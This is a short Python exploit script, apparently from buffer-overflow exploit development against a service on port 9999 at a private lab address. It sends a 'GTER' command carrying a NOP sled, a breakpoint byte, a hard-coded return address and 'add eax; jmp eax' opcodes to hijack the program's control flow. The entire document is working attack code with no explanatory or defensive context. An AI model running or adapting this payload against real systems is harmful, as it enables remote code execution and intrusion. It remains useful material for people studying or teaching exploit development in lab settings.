import socket, sys
payload=b""
payload+=b"\x90"*100
payload+=b"\xcc"
payload+=b"\x90"*50
payload+=b"\xaf\x11\x50\x62"
payload+=b"\x90"
payload+=b"\x83\xc0\x10"
payload+=b"\xff\xe0"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+payload))
s.close()
sys.exit()
